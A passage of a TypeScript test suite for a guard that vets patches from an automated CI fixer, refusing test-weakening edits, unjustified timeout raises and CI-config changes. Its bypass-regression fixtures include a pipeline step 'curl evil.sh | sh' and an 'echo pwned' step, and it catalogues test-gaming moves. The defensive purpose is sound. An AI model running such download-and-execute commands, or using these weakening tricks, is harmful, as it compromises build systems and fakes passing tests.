// @vitest-environment node
/**
 * What the diff guard's parser and scope rules are pinned to.
 *
 * The parser is the repo's first unified-diff reader, so the forms it must
 * survive are pinned one by one: `git show`'s commit message ahead of the
 * first header, additions and deletions against `/dev/null`, renames, binary
 * files, the one-line `@@` form, and `\ No newline at end of file`. The glob
 * matcher is pinned on every pattern the ticket names, including the
 * negatives — `scripts/buildkite-*` must not reach into a subdirectory, and
 * `.buildkite/**` must match the bare directory as well as what is under it.
 *
 * felipearos/ralph#152
 */
import { readFileSync } from "node:fs";
import { join } from "node:path";

import { describe, expect, it } from "vitest";

import {
  DEFAULT_DIFF_GUARD_CONFIG,
  diffGuardProblems,
  isTestConfig,
  matchesGlob,
  parseDiff,
  scopeProblems,
  timeoutProblems,
  weakeningProblems,
} from "./diff-guard";
import type { TimeoutEvidence } from "./diff-guard";

const FIXTURES = join(__dirname, "..", "fixtures", "ci-doctor", "diffs");

const diffOf = (body: string): string => body.replace(/^\n/, "");

describe("parseDiff", () => {
  it("reads a single edited file, ignoring anything before the first header", () => {
    const files = parseDiff(
      diffOf(`
commit 75c30fffcb23b26d2a8a5ed06f7a6ae2b36094b0
Author: Felipe Aros <dev@example.com>

    test(ci): conformance walks run once

diff --git a/src/a.test.ts b/src/a.test.ts
index 1111111..2222222 100644
--- a/src/a.test.ts
+++ b/src/a.test.ts
@@ -1,3 +1,3 @@
 before
-old line
+new line
`),
    );
    expect(files).toHaveLength(1);
    expect(files[0]?.path).toBe("src/a.test.ts");
    expect(files[0]?.oldPath).toBe("src/a.test.ts");
    expect(files[0]?.hunks).toHaveLength(1);
    expect(files[0]?.hunks[0]?.newStart).toBe(1);
    expect(files[0]?.hunks[0]?.lines).toEqual([
      { kind: " ", text: "before" },
      { kind: "-", text: "old line" },
      { kind: "+", text: "new line" },
    ]);
  });

  it("reads several files in one diff", () => {
    const files = parseDiff(
      diffOf(`
diff --git a/src/a.test.ts b/src/a.test.ts
--- a/src/a.test.ts
+++ b/src/a.test.ts
@@ -1 +1 @@
-a
+b
diff --git a/src/b.test.ts b/src/b.test.ts
--- a/src/b.test.ts
+++ b/src/b.test.ts
@@ -4 +4 @@
-c
+d
`),
    );
    expect(files.map((file) => file.path)).toEqual(["src/a.test.ts", "src/b.test.ts"]);
    // The one-line `@@ -4 +4 @@` form carries no count.
    expect(files[1]?.hunks[0]?.newStart).toBe(4);
  });

  it("marks an added file and a deleted file, and names the deleted one", () => {
    const files = parseDiff(
      diffOf(`
diff --git a/src/new.test.ts b/src/new.test.ts
new file mode 100644
--- /dev/null
+++ b/src/new.test.ts
@@ -0,0 +1 @@
+it("works", () => {});
diff --git a/src/gone.test.ts b/src/gone.test.ts
deleted file mode 100644
--- a/src/gone.test.ts
+++ /dev/null
@@ -1 +0,0 @@
-it("worked", () => {});
`),
    );
    expect(files[0]?.added).toBe(true);
    expect(files[0]?.path).toBe("src/new.test.ts");
    expect(files[1]?.deleted).toBe(true);
    expect(files[1]?.path).toBe("src/gone.test.ts");
  });

  it("reads a rename, keeping both sides", () => {
    const files = parseDiff(
      diffOf(`
diff --git a/src/old.test.ts b/src/new.test.ts
similarity index 98%
rename from src/old.test.ts
rename to src/new.test.ts
`),
    );
    expect(files[0]).toMatchObject({ renamed: true, oldPath: "src/old.test.ts", path: "src/new.test.ts" });
  });

  it("marks a binary file and gives it no hunks", () => {
    const files = parseDiff(
      diffOf(`
diff --git a/fixtures/shot.png b/fixtures/shot.png
Binary files a/fixtures/shot.png and b/fixtures/shot.png differ
`),
    );
    expect(files[0]?.binary).toBe(true);
    expect(files[0]?.hunks).toEqual([]);
  });

  it("drops the no-newline marker rather than reading it as context", () => {
    const files = parseDiff(
      diffOf(`
diff --git a/src/a.test.ts b/src/a.test.ts
--- a/src/a.test.ts
+++ b/src/a.test.ts
@@ -1 +1 @@
-a
\\ No newline at end of file
+a
`),
    );
    expect(files[0]?.hunks[0]?.lines).toEqual([
      { kind: "-", text: "a" },
      { kind: "+", text: "a" },
    ]);
  });

  it("keeps an empty context line, which git writes with no leading space", () => {
    const files = parseDiff(
      diffOf(`
diff --git a/src/a.test.ts b/src/a.test.ts
--- a/src/a.test.ts
+++ b/src/a.test.ts
@@ -1,3 +1,3 @@
 one

+two
`),
    );
    expect(files[0]?.hunks[0]?.lines).toHaveLength(3);
    expect(files[0]?.hunks[0]?.lines[1]).toEqual({ kind: " ", text: "" });
  });

  it("is empty for text that holds no diff", () => {
    expect(parseDiff("just a log line\nand another\n")).toEqual([]);
  });
});

describe("matchesGlob", () => {
  it("lets ** cross directories and * stop at one", () => {
    expect(matchesGlob("**/*.test.ts", "src/app/a.test.ts")).toBe(true);
    // A top-level file has no directory for `**/` to match, and still counts.
    expect(matchesGlob("**/*.test.ts", "a.test.ts")).toBe(true);
    expect(matchesGlob("**/*.test.ts", "src/a.ts")).toBe(false);
    expect(matchesGlob("**/*.test.tsx", "src/a.test.tsx")).toBe(true);
    expect(matchesGlob("**/__tests__/**", "src/__tests__/a.ts")).toBe(true);
    expect(matchesGlob("**/__tests__/**", "src/deep/__tests__/nested/a.ts")).toBe(true);
    expect(matchesGlob("src/test/**", "src/test/setup.ts")).toBe(true);
    expect(matchesGlob("src/test/**", "src/testing/setup.ts")).toBe(false);
  });

  it("matches a `dir/**` pattern against the bare directory too", () => {
    expect(matchesGlob(".buildkite/**", ".buildkite/pipeline.yml")).toBe(true);
    expect(matchesGlob(".buildkite/**", ".buildkite/steps/deep/run.sh")).toBe(true);
    expect(matchesGlob(".buildkite/**", ".buildkite")).toBe(true);
    expect(matchesGlob(".buildkite/**", ".buildkite-old/pipeline.yml")).toBe(false);
  });

  it("stops a single * at the path separator", () => {
    expect(matchesGlob("scripts/buildkite-*", "scripts/buildkite-upload.sh")).toBe(true);
    expect(matchesGlob("scripts/buildkite-*", "scripts/buildkite-a/b.sh")).toBe(false);
    expect(matchesGlob("scripts/buildkite-*", "scripts/other.sh")).toBe(false);
  });

  it("treats a plain pattern as the literal path, regex characters included", () => {
    expect(matchesGlob(".mergify.yml", ".mergify.yml")).toBe(true);
    expect(matchesGlob(".mergify.yml", "xmergify.yml")).toBe(false);
    expect(matchesGlob(".mergify.yml", "a/.mergify.yml")).toBe(false);
  });
});

describe("scopeProblems", () => {
  const scopeOf = (diff: string, exactRevert = false): string[] =>
    scopeProblems(parseDiff(diff), DEFAULT_DIFF_GUARD_CONFIG, { exactRevert });

  const edit = (path: string): string =>
    diffOf(`
diff --git a/${path} b/${path}
--- a/${path}
+++ b/${path}
@@ -1 +1 @@
-a
+b
`);

  it("accepts a file inside the fix scope", () => {
    expect(scopeOf(edit("src/app/a.test.ts"))).toEqual([]);
    expect(scopeOf(edit("src/test/setup.ts"))).toEqual([]);
  });

  it("refuses a file outside the fix scope, naming the scope", () => {
    expect(scopeOf(edit("src/lib/thing.ts"))).toEqual([
      "src/lib/thing.ts: outside the doctor's fix scope (**/*.test.ts, **/*.test.tsx, **/__tests__/**, src/test/**).",
    ]);
  });

  it("refuses a neverTouch path whether or not the diff is an exact revert", () => {
    const refusal = [".buildkite/pipeline.yml: CI configuration is never the doctor's to edit (matches neverTouch)."];
    expect(scopeOf(edit(".buildkite/pipeline.yml"))).toEqual(refusal);
    expect(scopeOf(edit(".buildkite/pipeline.yml"), true)).toEqual(refusal);
  });

  it("names a neverTouch path once, by that rule rather than by the fix scope", () => {
    // `.github/workflows/ci.yml` is outside the fix scope too; the graver rule wins.
    expect(scopeOf(edit(".github/workflows/ci.yml"))).toHaveLength(1);
  });

  it("lets an exact revert leave the fix scope", () => {
    expect(scopeOf(edit("src/lib/thing.ts"), true)).toEqual([]);
  });

  it("judges both sides of a rename", () => {
    const problems = scopeOf(
      diffOf(`
diff --git a/src/lib/old.ts b/src/new.test.ts
rename from src/lib/old.ts
rename to src/new.test.ts
`),
    );
    expect(problems).toEqual([
      "src/lib/old.ts: outside the doctor's fix scope (**/*.test.ts, **/*.test.tsx, **/__tests__/**, src/test/**).",
    ]);
  });
});

describe("weakeningProblems", () => {
  const fileDiff = (path: string, body: string): string =>
    diffOf(`
diff --git a/${path} b/${path}
--- a/${path}
+++ b/${path}
@@ -1,4 +1,4 @@
${body}`);

  const judge = (path: string, body: string): string[] => weakeningProblems(parseDiff(fileDiff(path, body)));

  it("refuses each switch-the-test-off token", () => {
    const cases: [string, string][] = [
      ["it.skip(\"x\", () => {});", "`.skip`"],
      ["it.only(\"x\", () => {});", "`.only`"],
      ["it.todo(\"x\");", "`.todo`"],
      ["it.fails(\"x\", () => {});", "`.fails`"],
      ["test.fixme(\"x\", () => {});", "`.fixme`"],
      ["it.skipIf(slow)(\"x\", () => {});", "`skipIf`"],
      ["it.runIf(fast)(\"x\", () => {});", "`runIf`"],
      ["xit(\"x\", () => {});", "`xit`"],
      ["xdescribe(\"x\", () => {});", "`xdescribe`"],
      ["  retry: 2,", "a retry count"],
      ["  retries = 3;", "a retry count"],
    ];
    for (const [line, label] of cases) {
      expect(judge("src/a.test.ts", `+${line}\n`), line).toEqual([
        `src/a.test.ts: adds ${label} (1 more than it removes, within one hunk) — a test that does not run is not a fix.`,
      ]);
    }
  });

  it("counts a weakener net, so moving a line is not a refusal", () => {
    expect(judge("src/a.test.ts", '-  it.skip("x", () => {});\n+it.skip("x", () => {});\n')).toEqual([]);
  });

  it("ignores a weakener that is only mentioned in a comment", () => {
    expect(judge("src/a.test.ts", "+// was it.skip before this fix\n+/* .only too */\n")).toEqual([]);
  });

  it("accepts a diff that removes a weakener", () => {
    expect(judge("src/a.test.ts", '-  it.skip("x", () => {});\n+  it("x", () => {});\n')).toEqual([]);
  });

  it("refuses a deleted assertion that nothing replaces", () => {
    expect(judge("src/a.test.ts", "-    expect(rows).toEqual([]);\n+    // checked elsewhere\n")).toEqual([
      "src/a.test.ts: deletes 1 assertion without replacing them.",
    ]);
  });

  it("accepts a rewritten assertion, and a diff that adds more than it drops", () => {
    expect(judge("src/a.test.ts", "-    expect(rows).toEqual([]);\n+    expect(rows).toHaveLength(0);\n")).toEqual([]);
    expect(
      judge("src/a.test.ts", "-    expect(a).toBe(1);\n+    expect(a).toBe(1);\n+    expect(b).toBe(2);\n"),
    ).toEqual([]);
  });

  it("refuses a deleted test, and a deleted test file", () => {
    expect(judge("src/a.test.ts", '-  it("still matters", () => {});\n')).toEqual([
      "src/a.test.ts: deletes 1 test — the doctor fixes tests, it does not remove them.",
    ]);
    const deletion = parseDiff(
      diffOf(`
diff --git a/src/gone.test.ts b/src/gone.test.ts
deleted file mode 100644
--- a/src/gone.test.ts
+++ /dev/null
@@ -1,2 +0,0 @@
-it("worked", () => { expect(1).toBe(1); });
-
`),
    );
    expect(weakeningProblems(deletion)).toEqual([
      "src/gone.test.ts: deletes 1 assertion without replacing them.",
      "src/gone.test.ts: deletes 1 test — the doctor fixes tests, it does not remove them.",
      "src/gone.test.ts: deletes a test file — the doctor fixes tests, it does not remove them.",
    ]);
  });

  it("accepts a renamed test, which deletes and adds one declaration", () => {
    expect(judge("src/a.test.ts", '-  it("old name", () => {\n+  it("clearer name", () => {\n')).toEqual([]);
  });

  describe("in a test runner's config", () => {
    it("refuses a new exclude key and a new entry inside an existing exclude block", () => {
      expect(judge("vitest.config.ts", '+    exclude: ["src/flaky.test.ts"],\n')).toEqual([
        "vitest.config.ts: adds an `exclude` entry, which stops a suite running rather than fixing it.",
      ]);
      expect(judge("vitest.config.ts", '     exclude: [\n+      "src/flaky.test.ts",\n     ],\n')).toEqual([
        "vitest.config.ts: adds an `exclude` entry, which stops a suite running rather than fixing it.",
      ]);
    });

    it("accepts a removed exclude entry", () => {
      expect(judge("vitest.config.ts", '     exclude: [\n-      "src/flaky.test.ts",\n     ],\n')).toEqual([]);
    });

    it("refuses a deleted coverage threshold", () => {
      expect(judge("vitest.config.ts", "-        lines: 80,\n")).toEqual([
        "vitest.config.ts: deletes the `lines` coverage threshold.",
      ]);
    });

    it("refuses a LOWERED threshold, which is how one is really dropped", () => {
      // The line survives, so counting occurrences saw nothing. Lowering the
      // number is the ordinary move and deleting the line is the rare one.
      expect(judge("vitest.config.ts", "-        lines: 90,\n+        lines: 10,\n")).toEqual([
        "vitest.config.ts: drops the `lines` coverage threshold from 90 to 10.",
      ]);
      expect(
        judge("vitest.config.ts", "-        branches: 70,\n-        lines: 90,\n+        branches: 10,\n+        lines: 10,\n"),
      ).toHaveLength(2);
    });

    it("accepts a raised threshold", () => {
      expect(judge("vitest.config.ts", "-        lines: 80,\n+        lines: 90,\n")).toEqual([]);
    });

    it("judges only a test runner's config", () => {
      expect(isTestConfig("vitest.config.ts")).toBe(true);
      expect(isTestConfig("packages/web/playwright.config.mts")).toBe(true);
      expect(isTestConfig("next.config.ts")).toBe(false);
      expect(judge("next.config.ts", '+  exclude: ["src/flaky.test.ts"],\n')).toEqual([]);
    });
  });
});

describe("timeoutProblems", () => {
  const raise = (body: string): string =>
    diffOf(`
diff --git a/src/a.test.ts b/src/a.test.ts
--- a/src/a.test.ts
+++ b/src/a.test.ts
@@ -1,6 +1,6 @@
${body}`);

  const judge = (body: string, evidence: TimeoutEvidence | null = null): string[] =>
    timeoutProblems(parseDiff(raise(body)), DEFAULT_DIFF_GUARD_CONFIG, evidence);

  // The opener and the line that closes it share an indent, as real code
  // does: that is what tells a test's own bound from a nested call's.
  const WITHIN_CEILING = '   it("walks", () => {\n-  }, 5000);\n+  }, 20000);\n';

  it("refuses a raise with no measured evidence", () => {
    expect(judge(WITHIN_CEILING)).toEqual([
      "src/a.test.ts: `}, 20000);` raises a test bound to 20000ms with no measured evidence — put the CI and local times in the PR body.",
    ]);
  });

  it("accepts a raise inside 3× the worst observed CI duration", () => {
    expect(judge(WITHIN_CEILING, { worstCiMs: 9_000, localMs: 2_000 })).toEqual([]);
  });

  it("refuses a raise beyond 3× the worst observed CI duration", () => {
    expect(judge(WITHIN_CEILING, { worstCiMs: 4_000, localMs: 2_000 })).toEqual([
      "src/a.test.ts: `}, 20000);` raises a test bound to 20000ms, over 3× the worst observed CI duration (4000ms in CI, 2000ms locally → at most 12000ms).",
    ]);
  });

  it("refuses a raise over the ceiling however good the evidence is", () => {
    expect(judge('   it("walks", () => {\n-  }, 5000);\n+  }, 60000);\n', { worstCiMs: 50_000, localMs: 40_000 })).toEqual([
      "src/a.test.ts: `}, 60000);` raises a test bound to 60000ms, over the 30000ms ceiling for a test.",
    ]);
  });

  it("gives a hook its own, higher ceiling", () => {
    const hook = "   beforeAll(() => {\n     walk();\n-  }, 5000);\n+  }, 100000);\n";
    expect(judge(hook, { worstCiMs: 40_000, localMs: 9_000 })).toEqual([]);
    const test = '   it("walks", () => {\n     walk();\n-  }, 5000);\n+  }, 100000);\n';
    expect(judge(test, { worstCiMs: 40_000, localMs: 9_000 })).toEqual([
      "src/a.test.ts: `}, 100000);` raises a test bound to 100000ms, over the 30000ms ceiling for a test.",
    ]);
  });

  it("resolves a bound written as a named constant", () => {
    const named = "+const WALK_TIMEOUT = 60_000;\n   beforeAll(() => {\n-  }, 5000);\n+  }, WALK_TIMEOUT);\n";
    expect(judge(named, { worstCiMs: 5_000, localMs: 1_000 })).toEqual([
      "src/a.test.ts: `}, WALK_TIMEOUT);` raises a hook bound to 60000ms, over 3× the worst observed CI duration (5000ms in CI, 1000ms locally → at most 15000ms).",
    ]);
  });

  it("accepts a lowered bound with no evidence at all", () => {
    expect(judge('   it("walks", () => {\n-  }, 20000);\n+  }, 5000);\n')).toEqual([]);
  });

  it("reads a named config bound, and takes hookTimeout as a hook", () => {
    const config = (body: string): string[] =>
      timeoutProblems(parseDiff(raise(body)), DEFAULT_DIFF_GUARD_CONFIG, null);
    expect(config("-    testTimeout: 5000,\n+    testTimeout: 60000,\n")).toEqual([
      "src/a.test.ts: `testTimeout: 60000,` raises a test bound to 60000ms, over the 30000ms ceiling for a test.",
    ]);
    expect(config("-    hookTimeout: 5000,\n+    hookTimeout: 60000,\n")).toEqual([
      "src/a.test.ts: `hookTimeout: 60000,` raises a hook bound to 60000ms with no measured evidence — put the CI and local times in the PR body.",
    ]);
  });
});

describe("the exact-revert exception", () => {
  const revert = readFileSync(join(FIXTURES, "revert-of-culprit.diff"), "utf8");

  it("accepts a diff byte-identical to `git revert <culprit>` outside the fix scope", () => {
    expect(diffGuardProblems(revert, { revert })).toEqual([]);
  });

  it("refuses one that differs by a line", () => {
    const altered = revert.replace("return rows.reduce(merge, empty());", "return rows.reduce(mergeSlow, empty());");
    expect(altered).not.toBe(revert);
    expect(diffGuardProblems(altered, { revert })).toEqual([
      "the diff is offered as a revert but is not byte-identical to `git revert` on this base.",
      "src/server/list-summary/aggregate.ts: outside the doctor's fix scope (**/*.test.ts, **/*.test.tsx, **/__tests__/**, src/test/**).",
    ]);
  });

  it("ignores blob hashes and hunk offsets, which a regenerated revert moves", () => {
    const regenerated = revert.replace("index 2222222..1111111 100644", "index 9999999..8888888 100644");
    expect(diffGuardProblems(regenerated, { revert })).toEqual([]);
  });

  it("refuses a neverTouch path even inside an exact revert", () => {
    const pipeline = readFileSync(join(FIXTURES, "buildkite-edited.diff"), "utf8");
    expect(diffGuardProblems(pipeline, { revert: pipeline })).toEqual([
      ".buildkite/pipeline.yml: CI configuration is never the doctor's to edit (matches neverTouch).",
    ]);
  });

  it("is not opened by a revert the caller did not supply", () => {
    expect(diffGuardProblems(revert)).toEqual([
      "src/server/list-summary/aggregate.ts: outside the doctor's fix scope (**/*.test.ts, **/*.test.tsx, **/__tests__/**, src/test/**).",
    ]);
  });
});

describe("felipearos/ralph#152's acceptance criteria, against checked-in diffs", () => {
  const judge = (name: string, context = {}): string[] =>
    diffGuardProblems(readFileSync(join(FIXTURES, name), "utf8"), context);

  it.each([
    ["skip-added.diff", "adds `.skip`"],
    ["retry-in-config.diff", "adds a retry count"],
    ["expect-deleted.diff", "deletes 1 assertion"],
    ["exclude-added.diff", "adds an `exclude` entry"],
    ["timeout-raised-without-evidence.diff", "raises a test bound to 60000ms"],
    ["timeout-raised-under-ceiling.diff", "with no measured evidence"],
    ["buildkite-edited.diff", "CI configuration is never the doctor's to edit"],
  ])("refuses %s", (name, expected) => {
    const problems = judge(name);
    expect(problems.length).toBeGreaterThan(0);
    expect(problems.join("\n")).toContain(expected);
  });

  it("accepts the under-ceiling raise once the PR body carries the evidence", () => {
    // `timeout-raised-without-evidence.diff` trips the 30s ceiling first, so
    // the evidence branch the AC names needs a raise that stays under it.
    expect(judge("timeout-raised-under-ceiling.diff", { evidence: { worstCiMs: 9_000, localMs: 7_000 } })).toEqual([]);
  });

  /**
   * AC 2 as the ticket writes it cannot hold beside the ticket's own timeout
   * rule, and this pins the real diff rather than a reading of it.
   *
   * The ticket says the guard accepts loggd #1728 and notes "#1728's
   * `beforeAll(…, 120_000)` sits at that cap". The commit (loggd
   * `75c30fffc`, 12 files, checked in here verbatim) raises FIVE bounds to
   * 120 s: two `beforeAll` hooks, which the ticket's 120 s hook cap allows,
   * and THREE `it(…)` bounds, four times the 30 s per-test ceiling the same
   * rule sets. (A third `beforeAll`, in `src/test/ratchet-base.test.ts`,
   * carries no bound at all.) Every other rule accepts the diff: all twelve
   * paths are in the fix scope, it adds no weakener, and in both files where
   * it deletes an assertion it adds more than it deletes.
   *
   * There is a second conflict with AC 2, and no config key fixes it: the
   * real PR body carries no measured durations, so there is nothing to
   * satisfy the evidence rule with, and nothing from which "3x the worst
   * observed CI duration" could be computed. The diff raises a bound
   * precisely because the walk TIMED OUT, which is the one case where the
   * worst observed duration is unmeasurable by construction. The evidence
   * used below is supplied by this test, not taken from the PR.
   *
   * Both halves belong on the issue, not only here: the issue's own rule is
   * that a refusal is a finding to be filed, and that applies to a finding
   * about the issue.
   */
  describe("loggd #1728", () => {
    const evidence = { worstCiMs: 41_000, localMs: 9_000 };

    it("is refused on its three per-test raises past the 30s ceiling", () => {
      expect(judge("loggd-1728-conformance-walks.diff", { evidence })).toEqual([
        "src/app/api/v1/media-mode-conformance.test.ts: `}, WALK_TIMEOUT);` raises a test bound to 120000ms, over the 30000ms ceiling for a test.",
        "src/app/api/v1/profile-subject-conformance.test.ts: `}, 120_000);` raises a test bound to 120000ms, over the 30000ms ceiling for a test.",
        "src/app/api/v1/route-conformance.test.ts: `}, 120_000);` raises a test bound to 120000ms, over the 30000ms ceiling for a test.",
      ]);
    });

    it("is accepted whole once the per-test ceiling is configured at the hook's", () => {
      expect(judge("loggd-1728-conformance-walks.diff", { config: { testTimeoutCeilingMs: 120_000 }, evidence })).toEqual([]);
    });

    it("still needs evidence its own PR body never carried: all five raises are refused without it", () => {
      const problems = judge("loggd-1728-conformance-walks.diff", { config: { testTimeoutCeilingMs: 120_000 } });
      expect(problems).toHaveLength(5);
      expect(problems.every((problem) => problem.includes("no measured evidence"))).toBe(true);
    });
  });
});

describe("the ways round the guard that review found", () => {
  /**
   * Each case here was ACCEPTED by the first implementation and is a
   * regression test, not a hypothetical. Review of #152 produced them by
   * attacking the parser and the regexes rather than by reading them.
   */
  const refuses = (diff: string): string[] => {
    const problems = diffGuardProblems(diff);
    expect(problems.length, `expected a refusal for:\n${diff}`).toBeGreaterThan(0);
    return problems;
  };

  it("does not read a hunk's content as a file header", () => {
    // `--- a/src/a.test.ts` on a removed line is CONTENT. Honouring it both
    // renamed the file and dropped the rest of the hunk, so the pipeline edit
    // below it went unseen.
    const problems = refuses(
      diffOf(`
diff --git a/.buildkite/pipeline.yml b/.buildkite/pipeline.yml
--- a/.buildkite/pipeline.yml
+++ b/.buildkite/pipeline.yml
@@ -1,4 +1,5 @@
 steps:
--- a/src/a.test.ts
+++ b/src/a.test.ts
   - command: bun test
+  - command: curl evil.sh | sh
`),
    );
    expect(problems[0]).toContain(".buildkite/pipeline.yml");
    expect(parseDiff(diffOf(`
diff --git a/.buildkite/pipeline.yml b/.buildkite/pipeline.yml
--- a/.buildkite/pipeline.yml
+++ b/.buildkite/pipeline.yml
@@ -1,2 +1,2 @@
--- a/src/a.test.ts
+++ b/src/a.test.ts
`))[0]?.path).toBe(".buildkite/pipeline.yml");
  });

  it("sees a weakener below a line that merely looks like a header", () => {
    expect(refuses(
      diffOf(`
diff --git a/src/a.test.ts b/src/a.test.ts
--- a/src/a.test.ts
+++ b/src/a.test.ts
@@ -1,3 +1,3 @@
--- a stale comment
+  it.skip("x", () => {});
`),
    )[0]).toContain("adds `.skip`");
  });

  it("does not wave through a bound that is not a bare literal", () => {
    // Failing open on exactly the expression worth checking is the wrong
    // default: both of these reach 600s past a 30s ceiling.
    const judgeBound = (bound: string): string =>
      refuses(
        diffOf(`
diff --git a/src/a.test.ts b/src/a.test.ts
--- a/src/a.test.ts
+++ b/src/a.test.ts
@@ -1,3 +1,3 @@
 it("x", () => {
-}, 5000);
+}, ${bound});
`),
      )[0] as string;
    // Arithmetic of literals is worked out, so the refusal names the real
    // number rather than asking the author to restate it.
    expect(judgeBound("60 * 1000 * 10")).toContain("raises a test bound to 600000ms, over the 30000ms ceiling");
    // An identifier from another file cannot be, so it is refused as such.
    expect(judgeBound("HUGE")).toContain("not a literal this guard can check");
  });

  it("refuses input it could not read at all", () => {
    expect(refuses("this is not a diff\nbut it is non-empty\n")[0]).toContain("names no files");
    // git emits a combined diff whenever the index has unmerged paths.
    expect(
      refuses(
        diffOf(`
diff --cc .buildkite/pipeline.yml
index 111,222..333
--- a/.buildkite/pipeline.yml
+++ b/.buildkite/pipeline.yml
@@@ -1,3 -1,3 +1,3 @@@
  steps:
++ - command: echo pwned
`),
      )[0],
    ).toContain("cannot read");
    // An empty diff is not unreadable: there is simply nothing to judge.
    expect(diffGuardProblems("")).toEqual([]);
  });

  it("is not blinded by a line that closes a block comment", () => {
    expect(
      refuses(
        diffOf(`
diff --git a/src/a.test.ts b/src/a.test.ts
--- a/src/a.test.ts
+++ b/src/a.test.ts
@@ -1,3 +1,3 @@
+/*
+*/ describe.skip("suite", () => { it("x", () => {}); });
`),
      )[0],
    ).toContain("adds `.skip`");
  });

  it("does not read every call's last number as a timeout", () => {
    // Each of these was refused as "raises a test bound": a hard refusal of
    // correct code, which would have made the guard unusable in practice.
    const ordinary = [
      "  const head = rows.slice(0, 10);",
      "  expect(value).toBeCloseTo(0.1, 5);",
      "  expect(spy).toHaveBeenCalledWith(user, 3);",
      "  await sleep(poll, 50000);",
    ];
    for (const line of ordinary) {
      expect(
        diffGuardProblems(
          diffOf(`
diff --git a/src/a.test.ts b/src/a.test.ts
--- a/src/a.test.ts
+++ b/src/a.test.ts
@@ -1,3 +1,3 @@
+${line}
`),
        ),
        line,
      ).toEqual([]);
    }
  });

  it("does not count a weakener named inside a string", () => {
    expect(
      diffGuardProblems(
        diffOf(`
diff --git a/src/a.test.ts b/src/a.test.ts
--- a/src/a.test.ts
+++ b/src/a.test.ts
@@ -1,3 +1,3 @@
+  const hint = "pass it.only to focus";
`),
      ),
    ).toEqual([]);
  });

  it("counts weakeners per hunk, so one cannot be moved onto another test", () => {
    expect(
      refuses(
        diffOf(`
diff --git a/src/a.test.ts b/src/a.test.ts
--- a/src/a.test.ts
+++ b/src/a.test.ts
@@ -1,2 +1,2 @@
-  it.skip("one", () => {});
+  it("one", () => {});
@@ -40,2 +40,2 @@
-  it("two", () => {});
+  it.skip("two", () => {});
`),
      )[0],
    ).toContain("adds `.skip`");
  });

  it("does not let an unrelated diff inherit the revert exception by position", () => {
    // Dropping context lines AND hunk offsets left only a multiset of changed
    // lines, so the same one-line edit elsewhere in the file matched — and an
    // exact revert skips every rule after the scope check.
    const at = (start: number, context: string): string =>
      diffOf(`
diff --git a/src/lib/x.ts b/src/lib/x.ts
--- a/src/lib/x.ts
+++ b/src/lib/x.ts
@@ -${start},3 +${start},3 @@
 ${context}
-old
+new
`);
    expect(diffGuardProblems(at(10, "context one"), { revert: at(10, "context one") })).toEqual([]);
    expect(diffGuardProblems(at(900, "context two"), { revert: at(10, "context one") }).length).toBeGreaterThan(0);
  });
});

describe("the ways round the guard, and the false refusals, that round 2 found", () => {
  /**
   * Round 1's fixes introduced these. A narrowed rule is where the next
   * defect goes, which is the argument for reviewing a review's fixes.
   */
  const judge = (lines: string[], context = {}): string[] =>
    diffGuardProblems(
      `diff --git a/src/a.test.ts b/src/a.test.ts\n--- a/src/a.test.ts\n+++ b/src/a.test.ts\n@@ -1,8 +1,8 @@\n${lines.join("\n")}\n`,
      context,
    );

  describe("a nested call's second argument is not the test's timeout", () => {
    // Refusing these refused the commonest shape in a flake fix — which is
    // the work this guard exists to let through.
    it.each([
      ["a useEffect dependency array", ["   it(\"renders\", () => {", "     useEffect(() => {", "-      load();", "+      reload();", "     }, []);", "   });"]],
      ["a setTimeout inside a promise", ["   it(\"x\", async () => {", "     await new Promise((r) => setTimeout(() => {", "-      r(1);", "+      r(2);", "     }, 50));", "   });"]],
      ["vitest's options-object argument", ["   it(\"x\", async () => {", "-    await a();", "+    await b();", "   }, { timeout: 5000 });"]],
      ["a debounce helper in the body", ["   it(\"renders\", () => {", "     const d = debounce(() => {", "-      a();", "+      b();", "     }, 100);", "   });"]],
      ["an array element that happens to be a number", ["   it(\"x\", () => {", "     const rows = [", "-      100,", "+      600000,", "     ];", "   });"]],
    ])("accepts %s", (_name, lines) => {
      expect(judge(lines as string[])).toEqual([]);
    });

    it("accepts a named bound that was only reindented", () => {
      expect(judge(["   it(\"x\", () => {", "-  }, WALK_TIMEOUT);", "+  }, WALK_TIMEOUT);"])).toEqual([]);
    });
  });

  describe("but a real raise is still caught", () => {
    it("on a test and on a hook, by their own ceilings", () => {
      expect(judge(["   it(\"x\", () => {", "     walk();", "-  }, 5000);", "+  }, 600000);"])[0]).toContain(
        "raises a test bound to 600000ms, over the 30000ms ceiling",
      );
      expect(judge(["   beforeAll(() => {", "     walk();", "-  }, 5000);", "+  }, 600000);"])[0]).toContain(
        "raises a hook bound to 600000ms, over the 120000ms ceiling",
      );
    });

    it("when the bound is on its own line, as prettier formats a long name", () => {
      const lines = ["   it(", "     \"a long name\",", "     async () => {", "       await walk();", "     },", "-    5000,", "+    600000,", "   );"];
      expect(judge(lines)[0]).toContain("raises a test bound to 600000ms");
    });

    it("when the hunk shows no opener at all, as three of loggd #1728's do", () => {
      // The `it(` is in an earlier hunk. Missing a real raise is worse than
      // judging one whose kind had to be assumed, and `test` is the stricter
      // of the two ceilings.
      expect(judge(["     expect(a).toBe(1);", "-  });", "+  }, 600000);"])[0]).toContain("raises a test bound");
    });
  });

  it("refuses a word diff, whose hunks parse to no lines at all", () => {
    const wordDiff = [
      "diff --git a/src/a.test.ts b/src/a.test.ts",
      "--- a/src/a.test.ts",
      "+++ b/src/a.test.ts",
      "@@ -1,3 +1,3 @@",
      'it[-(-]{+.skip(+}"x", () => {',
      "  [-expect(1).toBe(1);-]",
      "});",
      "",
    ].join("\n");
    // One file, one hunk, no lines: `.skip` added and two assertions gone,
    // and the first implementation of the fail-closed rule said nothing.
    expect(parseDiff(wordDiff)[0]?.hunks[0]?.lines).toEqual([]);
    expect(diffGuardProblems(wordDiff)[0]).toContain("not a word diff");
  });

  it("does not take `//` inside a string for the start of a comment", () => {
    // The bound at the end of this line was hidden by the URL before it.
    expect(judge(['   it("GET http://x", async () => {}, 5000);', '-  it("GET http://x", async () => {}, 5000);', '+  it("GET http://x", async () => {}, 600000);'])[0]).toContain(
      "raises a test bound to 600000ms",
    );
  });

  it("sees a threshold lowered in one of two blocks that share a key name", () => {
    const config = [
      "diff --git a/vitest.config.ts b/vitest.config.ts",
      "--- a/vitest.config.ts",
      "+++ b/vitest.config.ts",
      "@@ -1,8 +1,8 @@",
      "       thresholds: {",
      "-        lines: 90,",
      "+        lines: 10,",
      "         perFile: {",
      "-          lines: 50,",
      "+          lines: 50,",
      "         },",
      "",
    ].join("\n");
